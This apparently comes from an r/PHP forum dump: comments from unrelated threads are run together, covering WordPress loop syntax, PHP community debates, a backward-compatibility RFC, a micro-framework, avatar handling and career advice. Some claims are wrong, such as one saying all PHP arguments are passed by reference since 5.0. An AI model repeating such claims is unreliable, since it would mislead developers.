While I agree it's bad practice for PHP in general... if we just shove the WordPress developers off into a corner over here like we're prone to do in the PHP community, it's probably better to let WordPress developers do things the way other WordPress developers expect it done. For the sanity of the newbie.
For good or bad, there are lots of different PHP communities. And each person ends up referring to their own. There's the PHP core community of people who develop (or advise, or hang out with) the language itself. There's the self-proclaimed 'PHP Community', which includes those people, but also traditionally included everyone who worked day-in day-out with PHP for their daily job. They hang out on #phpc on freenode, and use Twitter heavily (for example). Though this is more the global community. There are plenty of local meetups, some of them, such as the New York PHP and Boston PHP, that are so large that they've become ecosystems of their own - and often can be (unfortunately) disconnected from the broader PHP community and not even know it exists. Each framework then has it's own community. Zend Framework, Symfony, Laravel. They have their own meetups, their own channels, etc. Each application does as well, WordPress, Drupal, Joomla!, Magento, etc... That being said, there's a fair bit of crossover as well. Especially between the 'framework' communities and the 'PHP community'. There isn't as much overlap between the web application communities, and the framework/PHP communities. Though many people are working to help out with this and pulling people together to be stronger as a combined team. For example Drupal which is now using Symfony components inside of it's core - Efforts via the PSR standards for frameworks to inter-operate more easily so that people can share and collaborate more, which in time will lead to communities coming together. This also is the goal for example of a conference I'm working on at the moment, php[world], in DC. To give a place for all these disparate communities to come together. DISCLAIMER: I'm conference chair and co-founder of the parent company that is running php[world].
Anyone who uses PHP is part of the community.
So the problem only exists if the array is passed by reference?
OH! Now I see what you're talking about. If you're expecting the output to change *during iteration* there's an issue. That use case hadn't crossed my mind, thanks!
I'm a WordPress developer and I find this very hard to read. I usually remove the Loop entirely and do my own thing. I like WordPress and use it a lot, but some of its syntax just boggles my mind. I also think using braces for your control and loop structures is far superior than this ridiculous colon and endwhile/endif/endswitch etc. crap that litters WordPress standard themes.
First of all not \_\_call(), but \_\_set() and \_\_get(). And why we need methods, properties? Just use \_\_set()/\_\_get()/\_\_call()/etc...
&gt;This is an awful way to do this Seriously? You didn't even recognize that it was WP code. That means you don't even really know what "this" is. Yet you feel entitled to scold and admonish all WP devs everywhere to break with deeply ingrained, widely accepted development conventions. And you didn't even feel the need to give a justification for it. I guess I *can* still be astonished by anti-Wordpress elitism. 
I was thinking to do a sub domain in nginx that uses php for that and then pointing the soap calls to the subdomain. Just haven't had a chance to investigate yet
Ha, wow. Okay, let's do this: - There's no legitimate reason to not use braces in this situation, and not using braces means that IDEs will have trouble helping you, that it will be very difficult to read, and you are virtually guaranteed to make errors in the future if this file changes with any frequency. - Having continuous PHP lines like this with their own open/close tags per line *is* a mess and *is* less readable. - I didn't immediately recognize those three lines as wordpress. Do not take that to mean I haven't served my time in WP. - The fact that this behavior is deeply ingrained and widely accepted is an example of *why* people shit all over wordpress. I'm trying to save this guy from himself. Yeah, sure, maybe WP devs have made their own little vortex where the rules are different, but unless this guy intends to spend his entire decades long career in wordpress, he should learn how to do it in a way that he won't get yelled at for everywhere else. The fact that you called this elitism is hilarious. It's not elitism, it's experience.
I won't argue its importance, because it's pointless. The question has no answer, so its importance is moot. As far as PHP-FIG and PHP internals go, the PHP-FIG's goal is improving interop between frameworks and other major projects. Their impact/benefit to the community - while huge, and certainly appreciated - is purely incidental. The PHP core maintainers have to make decisions on behalf of *everyone who uses the language*, not *the community* - a subtle, but significant difference.
I'd recommend dropping the id column in the tag column since the tag itself will be unique anyways. [Edit]I meant well. :-/
Assuming he uses MySQL, it will use a numerical id column whether or not you create one. If you make a table without a int, auto_increment primary key, MySQL still creates and maintains such a column internally. Additionally, the int key will take less bits to store as a key than the tag itself, which will matter for a join table such as this that may very easily grow to a large number of rows or be joined to other tables. Just using the tag name itself gives you no benefit at all, and creates additional problems.
stop hiring monk_e's 
I'm sorry but it's not really elitism. While it's fine within WordPress, outside of WordPress it's unacceptable and the kind of thing that makes a code reviewer want to throw a paperweight at your head when looking over your commits. WordPress uses PHP, and this is a ***terrible*** way to format PHP. /u/JordanLeDoux is a bit harsh, but he's not wrong.
The second example isn't really an improvement over anything. The first is preferred when not using a templating engine. (using a templating engine is always preferred though, WordPress just doesn't have one). HTML should never be echoed except BY a templating engine and excessive concatenation is very bad for performance.
Trust me, I understand. I've worked pair with a developer that learned all his PHP in version 4, then didn't program for several years.
If you install APC then the difference is smaller since it caches the code after compiling it. But be aware that all those spaces there are basically `echo`'s that output to the browser. All that output is slower, plus it makes your HTML page larger, plus more work for gzip (if you have that enabled). It's fine here and there when readability makes it important, but don't code everything like that.
Hey guys, I initially developed this framework for internal use while working at Phyramid in an attempt to bring some of the beautiful parts of Ruby and Node.js to PHP. It supports routes, MVC structure, Jade and Stylus. Its newest feature (added today) is support for the four main HTTP verbs, and I would love it if you could tell me what features you'd like to see. You might be asking: "Why not use Laravel?" There are a few great PHP frameworks, and Laravel is one of them. However, like jQuery, people usually only use a little bit of it. Purse aims to be a more lightweight solution, in the spirit of Sinatra — why include a huge framework when all you want is some routing functionality? (see Rails vs Sinatra) Thanks for hearing me out, and let me know what you think.
I find the claim that the change in BC brought about by unifying the variable syntax would produce errors that are "hard to debug" spurious. Why would code end up being any harder to debug than if the code was just written incorrectly? And even better, if you're a PHP programmer who follows along with the release notes you already know the old code will now not perform the same and hence have an increased awareness of what might cause the error you're seeing and probably find it EASIER to debug. (Array to string conversion... undefined variable array) To me, any error generated from the change in syntax would stand out like a sore thumb and I would argue that the "old meaning" was questionable in terms of expressiveness anyway. I find this line of argument tedious and it effectively serves as a generic straw man for never changing anything.
&gt;it's fine within WordPress That's exactly the point! What's the point of saying something is wrong because "it's unacceptable outside Wordpress" when the thing you're talking about is in fact in Wordpress? Basically what you're saying at that point is that it's bad because it's Wordpress. Maybe I'm alone in this opinion. But I'd greatly prefer this: &lt;div&gt; &lt;?php if(have_posts()) : while(have_posts()) : the_post(); ?&gt; //all my glorious markup &lt;?php endwhile; endif ?&gt; &lt;/div&gt; Over this: &lt;div&gt; &lt;?php if(have_posts()) : ?&gt; &lt;?php while(have_posts()) : ?&gt; &lt;?php the_post() ?&gt; //markup that's no longer properly indented &lt;?php endwhile ?&gt; &lt;?php endif ?&gt; &lt;/div&gt; Or especially something like this: &lt;div&gt; &lt;?php if(have_posts()) { while(have_posts()) { the_post(); ?&gt; //WTF is even happening? &lt;?php } } ?&gt; &lt;/div&gt; Sure! This is totally subjective! But if I am forced to mix PHP and HTML, I'd rather format it in a way that lets me preserve the indenting structure of the HTML. This keeps the PHP all in one tidy line and makes my front end co-workers happy. That said, I never do such complex nesting or logic inside of a template that I'd need my IDE to help me figure out where I am. I probably wouldn't even be using Wordpress at that point. 
Well. See reply [here](http://www.reddit.com/r/PHP/comments/2azerr/am_i_slowing_my_website_down_by_opening_and/cj0gdp8). The points re: WP devs taking these practices outside WP, and doing shitty shit there, is well taken. 
&gt; What's the point of saying something is wrong because "it's unacceptable outside Wordpress" when the thing you're talking about is in fact in Wordpress? Because it made its way to the /r/PHP subreddit. This is not /r/WordPress. As you can see, it's already left the WordPress sphere and entered the PHP community, and that is why it's important to make that distinction here.
Came here to say the same thing. What kind of old-man-yelling-at-kids-on-his-lawn votes against something because it will break BC in a major version? Major versions are supposed to break BC by improving core conventions that can be done better.
Would like to throw in a big warning here - Do **not** go searching for PHP comments section tutorials on the 'net. This was actually my very first project in PHP, and learning the basics from them taught me horrible standards that it took ages to get out of my system. Going through a PHP *course* like the one on Codeacademy might be a good place to start, though. (I haven't verified its content myself, but I've heard good things.)
These are all very good points, thank you, I'll get started on fixing them. For number 4, I think the namespace declaration has to be on the first line or something silly like that, that's why the coding style is all messed up there. I'll take a look at the problem again and make it nicer. I don't know how I didn't think of adding Composer, that's now the first thing on my list. Thanks for your feedback!
He seems to think it makes him look thoughtful and nuanced and experienced... :/ It makes him look like he doesn't understand semver.
&gt; I think the namespace declaration has to be on the first line or something silly like that Namespaces must be the [first line of executable code](http://php.net/manual/en/language.namespaces.definition.php) outside of a `declare` statement, but there is no whitespace (or comment) prohibition (edit: within a `&lt;?php` block. Non-PHP code, including whitespace, before the `&lt;?php` declaration is still prohibited). This is valid PHP: &lt;?php // This is a comment namespace Purse; use Jade;
That's kind of what I thought. When I saw the RFC vote yesterday I wondered who the one No-vote was. Now I don't really care what he votes on.
Thanks so much, man. 
And [Aura.View](https://github.com/auraphp/Aura.View) before that, and Zend_View before that, and [Savant](http://phpsavant.com) before that. ;-)
I'm sure he's more experienced and quite possibly thoughtful than most. Or at least me. But the reasoning laid out in this post doesn't make sense unless he thinks the language should never change at all.
By this logic, it would seem totally justifiable and even encouraged for any discussion or question related to Wordpress on this sub to be bogged down and derailed by haters prattling on endlessly about how shitty Wordpress itself can be. Maybe that's what people here want, but it would be unfortunate if that were the case. Wordpress *is* part of the PHP community, a huge part, albeit sort of isolated. And *most of this sub's readers* are probably going to interact with WP code in the future whether they want to or not. We'd be better off if we encouraged good Wordpress practices (yes, they exist) instead of constantly veering off into unhelpful criticisms of the platform itself, or rants about people who use it poorly. That is what I see as elitism (the mentality that all WP is bad and all WP devs are shit) and that is why I see it as problematic. /ranting
&gt; Accidents like [this](https://bugs.php.net/bug.php?id=66985) are certainly annoying, but slightly unavoidable as we do not have test cases for everything. That's not an accident, and it wasn't unavoidable. I got effed by that one too. You can't just remove something from the lang and not tell anyone. That said, I'm happy about this RFC. They've given us fair warning, and it's going into a *major* release, so it's fair game. That's exactly the time to introduce backwards-incompatible changes. Of course, it's going to break my 1M+ line PHP project, which means we'll probably never get to upgrade. So there's that. Derick says we can't write a scanner for this because it's impossible to tell which code has been upgraded, but can't we just be careful to run the tool exactly once?
&gt; The negotiation of the application-provided types against the q-value-ranked request types might not be something you want to do for every route in the router I think maybe you misunderstood what I was suggesting, as this would never happen. You would only do this for one route per request: the one that matched on URI and HTTP method. In pseudocode: for every route in route collection: does the URI match? yes: does the HTTP method match? yes: check Accept and route appropriately no: 405 method not allowed
&gt; why just not give us a god damn sane API for god's sake? at least for basic types, arrays, and such What do you mean? Type-hinting for basic types? That's not a backwards-incompatible. Re-working all the core functions OTOH isn't worthy. &gt; the only thing that stops me from doing more open source work What's any of this have to do with open source work?
This feels like reinventing the wheel, badly: http://www.slimframework.com/ http://silex.sensiolabs.org/
I would like to add to this critique, that explicitly passing by reference is completely unnecessary, unless you are aiming to support php 4. By the fact that you are using anonymous functions, I am assuming that is not your plan. All function and method arguments are implicitly passed by reference as of &gt;= php 5.0
I don't think there is "A single PHP Community". There are many. /r/php can be thought of as one community. Your local developer group could be another. There are PHP communities that care about best practice and PHP communities who don't. Of those who care there are those will argue until they are blue in the face about what best practice means.
It's a good effort, but it doesn't look like a good framework to be honest. I'm not even sure I could really call it a PHP framework. If what you want is a lightweight PHP framework, you can roll one from Aura, or you can use Silex, and both are much, much better, don't depend on Node (?!) or any other technologies, and easier to use.
&gt; By this logic, it would seem totally justifiable and even encouraged for any discussion or question related to Wordpress on this sub to be bogged down and derailed by haters prattling on endlessly about how shitty Wordpress itself can be. No, you're missing the point completely. Encouraging WordPress users to write proper PHP and not follow the idiotic trend set by the WordPress community is not "hating". &gt;We'd be better off if we encouraged good Wordpress practices (yes, they exist) instead of constantly veering off into unhelpful criticisms of the platform itself, or rants about people who use it poorly. That is exactly what I did. You need to stop being so defensive that you can't even read straight. 
Logically, you shouldnt even be using PHP for this, but a templating language.
the end* stuff i believe is PHP's attempt at providing templating...
&gt;he proves his brilliance in pretty much every conversation anyone ever has with him. I think you've got a little brown on your ~~nose~~ entire face there.
Yeah, store the path to the users avatar in your database. When the user is created set the path to the default. When they add their own, it should get overwritten. 
&lt;br/&gt;, actually
&gt;Then you've never used Symfony or Zend. Not the full framework. What on earth is their excuse for putting the logic that high rather than something more fluid like a factory? &gt;The route "/blog/posts" would match the same controller action regardless of the file extension, and the extension would be used to determine the output format. I don't understand. Is it your base controller picking the view or your extended controller? Ultimately I look at it like this: your base controller should only have functionality universal to all your extended controllers. The view is not universal. It's going to vary dramatically between controllers and even within them. The base controller outputs that view but it's up to the extended controllers to pick and format for it whether that's HTML, JSON, XML, RSS, your API, whatever.
Nice, I did something similar with a few more features. [You can check it here.](https://github.com/jackpopp/syml_php) I probably wouldn't use it in production it was just to learn stuff really. I think everyone should give writting a framework a go just to understand whats going on in the background. From what I can see your framework doesnt support dynamic routing? Might be worth adding that. 
The confusing-for-beginners scenario is: $arr = ['foo', 'bar']; foreach ($arr as $val) { $val = strtoupper($val); } var_dump($arr); // expect this to be ['FOO', 'BAR']
That's incredible. Considering it's 6 years since the last update I wonder if they're conscious of the security implications?
&gt; because it's impossible to tell which code has been upgraded, but can't we just be careful to run the tool exactly once? That's not what he means. Basically, if you have this code: Foo::bar[$baz]() How do you *know* if it has been converted or not? It is *valid* in both PHP5 and PHP6, they just mean different things. 
Thank you and feedback welcome. There is a todo if you are interested to check also.
Isn't this talking about template helper.... Why not https://github.com/auraphp/Aura.Html then ?
&gt; roll one from Aura Thank you for recommending Aura. If you want to check the source code on https://github.com/auraphp 
Just curious, what is so wrong with a "heavy" solution? What is the down side of using something like Symfony2 for a small project? Everything is lazy loaded, compiled to php and op code cached, I just don't see a benefit in learning two frameworks in order to save literally single digit milliseconds of execution time.
I'm sorry you don't like it. I'll try to make it better.
Thank you, I'll look into that.
Hi, &gt; 1, 2, and 3) None of the PSRs require the use of a specific library or tool. Composer support is not mandatory to be PSR-compliant. Please re-read what I wrote more carefully. At no point did I state that they must use Composer to be PSR-compliant or that any of the PSRs required the use of a specific library or tool. &gt; In fact, you do not need to implement any form of autoloading to be PSR-compliant. Please re-read [PSR-1](http://www.php-fig.org/psr/psr-1/) (and, by extension, PSR-2 and PSR-3) more carefully. PSR-1 clearly states: &gt; Namespaces and classes MUST follow an "autoloading" PSR: [PSR-0], [PSR-4]. and &gt; Namespaces and classes MUST follow PSR-0. (errattaed to also include PSR4). Finally: &gt; PSR-0 and 4 describe how your autoloader needs to behave, not that you must support autoloading. If your entire exception is with the fact that I said "comply with" instead of "follow" in my first point, your pedantry is well-noted and I've modified the wording in my original post. 
Add a column to your DB. hasAvatar default -1. If the value is -1. Check if file exist and update the database (1, if the file exists, 0 it it doesn't). If the user adds an avatar, you can set hasAvatar to 1, but when you look for it, you are going to update this value anyway. Don't save fileNames in the DB because if you move the avatar to S3 or a different location you only need to update 1 setting most likely in your PHP, vs having to update your whole database. There are other solutions, but they have pros and cons.
Performance aside, you will be outputting the indenting spaces at the start of each line. That will need to be taken into account for reasons, I suspect, other than performance. 
No. Don't think of it as actually turning PHP on/off that would require "booting" every time you turn it on. Even while it's "off", PHP is still running, only it's set to not pay attention to anything other than "&lt;?php" (or whichever other opening tag is also enabled), otherwise just echo everything literally.
providing you're using html for a quick fix use:&lt;img id="currentPhoto" src="SomeImage.jpg" onerror="this.src='Default.jpg'" width="100" height="120"&gt; This however still tries to load the image, which will be slower than php file_exists. I would store the filename, keep it to null if there is no avatar, or store the default filename instead. Do a check for the image with file_exists (skip this if avatar=null or default.jpg, depending on how you are storing the default) if file_exists comes back as false then update the db record to be null or default.jpg. 
I'd like the magic cast methods, but the issue is more complex than you might expect. How should my object be handled during automatic casting? What happens when my object has a __toArray() method and I pass it into a built-in function expecting an array input and returning an array output? And what about a function that modifies the array in place such as array_splice?
or how about saving the filename in the column, when the user is created, it points to the default avatar, when the user uploads an avatar, overwrite it. Then use that value to refer to the pic. (gotta give /u/beatryder [credit](http://www.reddit.com/r/PHP/comments/2b0rsp/currently_checking_the_file_system_for_every/cj0nrmh)
Can you give me some detail about why?
http://fatfreeframework.com/home etc etc
These magic methods are all for your juggling, not public interfaces. I mean, they will be used in a public context, but only in cases where you would expect that object to know how to cast itself into a type. Stuff like __get makes the public interfaces obfuscated, but this actually makes them more explicit.
Can you give actual real-world examples of where you'd want to use this? As far as I can see, what you want to do in the example you gave can easily be implemented by simply instead doing something along the lines of: if ($A-&gt;result()) { In my opinion, the code in your example is ambiguous to read. It could mean any of the following things: * $A is defined (and not NULL) * the string value of $A is truthy * the numeric value of $A is truthy * the boolean value of $A is TRUE It's my opinion that such ambiguity is a bad idea because it makes code harder to skim-read, which makes the code harder to maintain. I think your suggestion would be adding unnecessary complexity to the language. ...And I'm not even going to start on your __queryType() suggestion
Because this is a small breakage which will lead to more options in how we can use dereferencing. Changing the entire core API for the sake of a few idiosyncrasies is less compelling. That said there is nothing wrong with [extending PHP](https://github.com/nikic/scalar_objects). I would love to see that extension in the core It's just you have to be very careful with how you handle the deprecation of the old API, which essentially means you aren't going to get rid of it any time soon.
I will provide a better example later as I'm about to go to sleep, but mainly I would like these to build better containers, state machines and wrappers. If an object has a __toBoolean defined, then the result of that line isn't ambiguous... it's the return value of __toBoolean.
&gt; Stuff like __get makes the public interfaces obfuscated, but this actually makes them more explicit. Yes, I'm not against __toInteger() et al. but I really don't like __get(), __call() and friends.
Thank you so much for your feedback, it's very helpful and I'll work on improving Purse right away. 
Why are you using PHP for this? And why do you think you need to store additional information in your database? Presumably, each user has a unique id, and each user can have a single avatar, which is unique to that user. Right? So, use the user id as the filename for the avatar and let your web server handle the figuring out if the file exists or not - web servers are designed to do this quickly. Store each avatar at /avatars/[USER_ID].png, and configure your web server to serve the default avatar as the 404 page for the avatars directory.
Why? Whats wrong with 'connect() or die()' code examples? &lt;/sarcasm&gt; One thing that i did very early on in my travels was to wrap all of the mysql_xxx odbc_xxx mssql_xxx etc. functions with my own functions with case statements so i could easily switch database drivers without any more than a variable change.
Honestly, i think support could be implemented for these in an IDE...
The overhead of symfony doesn't require a reverse proxy to be usable, I haven't benchmarked different php frameworks, but I do know you're looking at 10-20ms to render a page on a bottom of the range VPS. You don't have to use auth, it costs almost nothing - the cost of not using it and needing it later is way higher.
But why? What do you gain by excluding it? I know symfony inside and out, so if I were to switch to a micro like silex/slim what would be the advantage? Or to put it another way, if you are serious about web dev you will need a full stack framework at some stage, why not just embrace it? What is the real downside to not having that other 95% available when you need it?
&gt; Look no further than how long it took for PHP 5 to gain traction I don't think that had anything to do with BC breaks. In fact there weren't really any major BC breaks in PHP 5.0.
Easy - while in PHP 5 you convert them all to the "old meaning", so using the examples from the article, change `$foo-&gt;$bar['baz']` into `$foo-&gt;{$bar['baz']}`. Now every time you see the "ambiguous" code, you know it's wrong. Then upgrade to PHP 6. For similar reasons I think they should fix the ternary operator. No one should be using it in the ambiguous style anyway, but those who are can easily convert it to use parentheses first, then upgrade.
Please never write an RFC.
Personally, I'm with nandano - anyone that has anything to do with PHP, whether that be writing code in it all the way up to the core developers, are a part of the "PHP community". That's one of the wonderful things about a community. There's no one set of criteria that make someone included in it. It takes all different kinds of people of all different skills and background to make up a good, strong community. Sure, there's always going to be subgroups inside the community as a whole...that happens with any large community. It's a good sign of growth, really. The key is to find where you fit in. It's a proven fact that (most) developers learn better when they're around others trying to achieve a similar goal. It lets them bounce ideas off of one another and use the knowledge of the other to feed their own, constantly improving their skills. Don't be fooled into thinking that you can't be a part of the PHP community somewhere just because you're not well-known. People like speakers, authors of (in)famous frameworks or even just user group organizers all started somewhere. They took that first step and got out there into the wider community as a whole and took in as much as they could. That's what community is about, really - the bringing together of shared knowledge and experience to make for something greater than we could be alone.
No that's if you're using XHTML.
Minor minor benefit is in IDEs - scanning/indexing megs of libraries when you're not using them has a *slight* cost. I don't buy the argument, but I think it does technically slow things down now and then. Autocomplete may end up showing you a load of stuff that will never be applicable to you, causing minor cognitive overhead. None of these are enough to avoid full stack imo. Having talked to a couple people about this last year, IIRC their concerns were having to dig through lots more docs to figure out how to do something - there's potentially more to configure/learn/tweak vs something like slim or even a roll-your-own. At least, it *feels* that way. I'd sort of like to see someone make a framework on top of a major framework, to reduce stuff even more - auto configured ORM that makes certain assumptions for you, preconfigured dependency injection, etc. I've been a bit spoiled by Grails, which is sort of like a dynamic language config on top of Spring MVC. The current frameworks in PHP sort of feel like where Spring is, but there could be another layer of nicety on top of it to reduce configuration even more (which is what Grails did). Is it everyone's cup of tea? No, but it might end up being mine. This is one of my 'to do' things in PHP - get back to a full stack framework and add a layer on top of it. But... too busy to focus on that right now. 
I'll let others rant about not worrying on performance and actually answer your question. Once the code has been turned into php's opcode, the only impact will be comparable to an echo call, to output the indent on the second line. When you do ?&gt; you aren't turning off php so much as saying "echo this string". 
Personal experience, not likely to be the norm: I've never been asked about my academic history. For the few places that have asked for a resume they didn't seem to care that I didn't graduate because they paid what I asked. In the end it probably depends on if your planning on working for a large firm or if you're contacting or working with smaller teams. 
If you are making a library, you should think through what a method should return. As long as you don't return anything, you can decide later, but once you already make something up, you won't be able to change it without breaking backwards compatibility. Returning `$this` is common though, and you could use Exceptions for exceptional behavior.
You code reviewer is telling you bullshit. A method returning nothing (i.e. null) is perfectly fine. And using exceptions instead of return values to handle errors is much better since it keeps your code flow much simpler.
That's what I was thinking. I'm currently working for a small company and my boss couldn't care less about my grades. I don't plan on ever working with a large firm since the notion of being a small fish in a big pond really doesn't appeal to me.
If that's the sort of thing your reviewer thinks then I don't want to ever work with code that they've written.
if you want to lose speed, do that.
If you have a year left, I think you should just finish it. Most of the stuff you learn in academia will only be relevant in edge cases, but that is when you need it the most in my opinion. If you can, keep your job while you finish school. Actual real world experience trumps a diploma for programmers, but the diploma does give you a bit of an edge when applying for jobs. Also, if you ever want to get a job at a large company, a diploma will come in handy.
&gt; post_tag{ post_id, tag_id } please don't do that, you lose so much speed. &gt; post_tag{ id, post_id, tag_id } would be the better solution.
I don't have any plans to relocate countries. As much as the weather sucks I like it here in England.
.. for exceptional errors. For exceptions. Not for errors that can occur any time (such as a validation error).
I don't expect / require anyone to have a degree - and I don't have one either. However, firstly, people are often surprised that I don't. It's one of those things that's kinda a given, for someone working in software dev to be 'clever' and that apparently mandates debt and exams to prove. Too each their own. I would argue that in your case though, throwing away all that debt would be silly. If you hadn't yet started your degree, and you had a raft of examples and completed projects, and other demonstrable experience, then that's a different story. But - and here's the interesting part imo - devs are in such demand right now that you can pretty much use this as a guarantee to get the job you want (ie the one you have) on graduation. Go and talk to the top man - not your boss, I'm talking about whoever runs the place. Explain your situation, and likely - if he / she's not a complete numpty - they will see your passion and desire, and make you a promise of a job offer on your graduation. Why? Because recruiting is a pain in the arse. It's expensive, it's time consuming, and it's filled with difficult-to-get-rid-of nincompoop's who don't fit in to the existing company culture. Whereas you sound like you fit in, do a good job, and are enthusiastic. All very highly sought after qualities. I sincerely hope you stay with it, and do well in your exams. Chris
And good lord, get `the_post()` on its own line. Every time I see this, I shudder.
Demand for programmers is very high these days. I don't think a degree matters as much as in other fields. Most of the programmers I know and work with are self-taught anyway. I would say the only time a degree might be useful for getting a job is if you have no other experience, but since you have this actual job that is much more valuable. Nobody will give a shit about the school thing, and if for some reason they did just tell the truth "I wound up with a really good job opportunity so I took that instead" -- assuming you stick with the job for a while, this is completely reasonable. Just my opinion though as a professional web developer for 12 years -- it might be different in England than it is here in the States.
I understand it being a silly move since I've already done 2 years. However my goal with Uni was to get a career out of it so my view is that I've already achieved this goal. Therefore to go back would be a step backward in both my happiness and financial stability. Also I'm really not concerned about the loan repayments. Perhaps taking a year off to work and observe my progress would be a wise move. Would you agree?
EE? What are you talking about? I live in Poland and I recently get at least 3 job propositions from germany, from 2 middle-big and one pretty big company. I don't have ANY degree. I just have experience.
I disagree. If my function can't do what it should, it's an exception. Validation is simply confirming you have what you need to do your job. If that fails, it's an exception. To act like there is a difference between the severity of the types of errors just introduces yet another layer of complexity you need to program into every other layer of your application. I hate hearing 'exceptional' errors. An error that stops flow is an error. Simple.
Although I agree with this technique... Many people I have worked with in the past would have a much harder time doing this then just doing it in php, so I can see the appeal.
I already proposed this exact functionality 2.5 years ago: https://wiki.php.net/rfc/object_cast_to_types You can use that as a starting point.
I don't have a degree. The only time it ever came up was late in a day full of interviews, like the 5th or 6th interview, and asked what my degree was in (like 3/4 way through the interview). I said "I don't have one" and he looked surprised. I got the job ;-)
If you are the kind of person that's wondering whether you need a degree you are typically not the kind of person that can get by on experience. For getting into the industry, a degree is an alternative to experience where experience is not as easily attainable. In my country, for somebody my age, getting a job in an industry like software development without a degree is difficult. Not because the degree itself is terribly useful but because there is a *lot* of competition and a generally high quantity of university graduates. You certainly don't *need* a degree, and after a few years in the industry it loses all its value when applying for new jobs anyway, but landing the first job will be easier if you have one.
&gt; If my function can't do what it should, it's an exception Depends on why it couldn't do what it should. If it's because of an expected flow, like invalid form input, then that's not exceptional (it's a part of the business logic of the application). If it's because something didn't work right, or validation that's not expected to fail (such as invalid XML when reading RSS), then that's exceptional. The difference comes down to the invariants. Is the method expecting valid data as a precondition of the method? If so, exception. If not (as in the case of a form, where it's valid *application* state to be invalid), then it's not exceptional. &gt; An error that stops flow is an error. Correct. And many errors don't stop flow, they cause a divergence in the flow (a branch). Those aren't exceptional. I did a writeup of this [on my blog](http://blog.ircmaxell.com/2011/08/error-handling-in-php.html)
Congrats :) and thanks for posting your experience.
I got my current work based on experience... May I ask what your country is?
If you don't mind me asking, do you work in a small or large company? Is it mostly developers or is it more Corporate?
School isn't about fun and it isn't necessarily about learning either. School and work are different kinds of experiences and both can be very valuable. I know nothing about your school or program, so I can't say anything about the kind of experience you will get by finishing your degree. However, I do know that you'll be working for the next 40+ years of your life. Sure, you'll change jobs and perhaps freelance after a while, but nothing you'll do again will be like school. I want to reiterate that I don't know what your school experience will be like; I'm not saying you should finish. I am saying that it is an experience that you will likely not ever have again, so seriously consider it. Lastly, as a personal peeve I wish students would stop worrying about whether their university schooling will help them in their job. If you go through a university course worrying about a career then you will miss the most valuable parts of schooling in my opinion.
I was pretty much in a same kind of situation as you almost 10 years ago. I had about one year of studies left, when I got a pretty nice webdev job in another city (with the exception that Flash was still hot shit back then, so it was an Actionscript job, which later turned into PHP, JS and all that when Flash slowly started dying). Even at that first job, no one cared about any degrees, only about "what can you do?" and "what have you done before?". When I got the job, I moved to the other city and took a break from the studies. That break almost turned into a permanent one, but I eventually finished my studies while also working for the same company. It took some hard work and travelling between two cities and I'm glad my employer was flexible and understanding about it. I've had several developer jobs after that and no one has ever cared about the degree at all, so I don't think I would've missed anything if I had just dropped out. Still, I'm glad I finished it, so I can have my peace of mind about not leaving something I had already worked for a few years unfinished. That was many years ago and today good developers are in even higher demand than back then. I think that after you've worked a couple of years, the work experience will be worth more than any degree. There are some jobs that require a CS degree (for a good reason, I think), but in most jobs it shouldn't be a problem.
Good to hear :) The degree I'm studying isn't a CS degree which I why I'm not sure it would hold-up greatly. The content is pretty basic and mostly things I taught myself years ago. In this year alone I've learnt even more including things not even covered by the Uni such as unit testing, proper design patterns, namespacing and Composer.
FWIW The developers of the default WP themes purposely make stuff easy to read and tweak for *non-developers*. Having each line have it's own php tags makes it easier for non-developers to insert HTML into the loop to tweak a theme without breaking themes. Developers working on their own themes not concerned with this are free to use whatever syntax they want.
I have actually been a freelancer most of my career. Worked as an employee at an agency for a few years, but I got that job based on experience (I had done contracting work in the past for the guy who hired me so he knew I was skilled and would show up every day).
While I understand your point I can assure you that there's nothing on my course worth being exposed to. Their content is highly outdated. For example they never covered HTML5 and only slightly touched on MVC.
Awesome. How did you get into freelancing? I can't really seem to find a solid means of sourcing clients.
Many people don't think about the cost of the degree when talking about "should I get one". You have one year left, so you've already invested X amount of money. That money is gone, done, forgotten, siphoned off by administration, and used to build monuments of educational glory.. aka football stadiums. Think about how much more future "Y" money it costs to get the degree. That's the real cost to you at this point. That Y would be worth a lot to me. Just because I think I'd only want to work for smaller employers now doesn't mean something won't peak my interests at a larger company later. If Y affords you just a small piece of opportunity in the future, I'd suggest taking it. You NEVER know what the future may bring. A degree means a lot of things. To me it means I may have just a slightly better opportunity than someone without. My first three jobs required one. My last two have not. My CS degree cost me &lt; 30k. 
My degree isn't a CS degree and is in-fact a much lesser degree. Hence why I can't see it bringing me many opportunities
I am aware of this, however its a relevant subreddit. I'm sure there are a few unemployed here.
$20k–$30k USD salary working for a UK finance startup, which is barely above minimum wage in either country, *and* you expect the person to not have other commitments because they're going to have to "cram"? Oof. This is not a serious job offer, regardless of whether or not this is a job board. 
What i meant, is that this isn't an appropriate place to post this. We don't want /r/php to turn into job postings.
Methods should return something _if it makes sense in the object/method context_. If it is not logical that the method should return something (like setters) you should not return something. It all depends on the context.
Denmark. I reiterate that you certainly *can* get a job without a degree. In fact, only one of my colleagues completed his university degree and the rest have little to no formal education, but the rest were also all there when the company started ten years ago. My employer makes no secret of wanting to hire only university graduates now and this is not a rarity. I have a degree. I don't regret getting it but I regret feeling -- with good reason -- that I needed it. I learned an awful lot, including things several of my colleagues don't know about (typically because these are things you don't think or want to look into on your own), but by no means was it an efficient way to spend my time and I disliked the environment and bureaucracy intensely. I was never comfortable there and I don't want to go back (I like education but not the way it works in university), but it was the simplest way for me to make myself an attractive candidate. I am only ~~only~~ glad there's no tuition here.
Just to be clear, I'd never want to work for a large company. I interviewed for a couple of large companies before settling on my current one. With all of them I found the atmosphere pretty disheartening since all I saw was a bunch of people making minor changes to a huge project. Instead I would much prefer to work in small companies or freelance.
I don't always agree with Stas, but this sums it up pretty well: &gt; [...] But we can make it so, and a major version is a good opportunity to do it. Major version is expected to break some things. That does not mean it should, but it is an acceptable price if necessary.
Agreed. A degree is a key that unlocks very particular doors. In big companies those doors are typically labeled "manager".
Apologies, I didn't realize it would upset any of the subscribers.
I felt the same way about my CIS degree. I learned COBOL for crying out loud. There were no web courses available at all. But, as I've been working in the field (now for 11 years, goodness) I find that the things I learned at school have been helpful for me. My degree did not teach me current technologies or the latest ways to do things. They taught me the fundamentals of computer science, which is going to be useful 30 years from now, unlike HTML5.
I posted exactly the same thing in /r/mysql because I thought it was the truth, and I was wrong. If you make post_id and tag_id a composite primary key, it should be faster and more efficient. The problem arise when people don't create a **primary key**, and just do post_id and tag_id.. then MySQL assigns a numerical primary key in the background. 
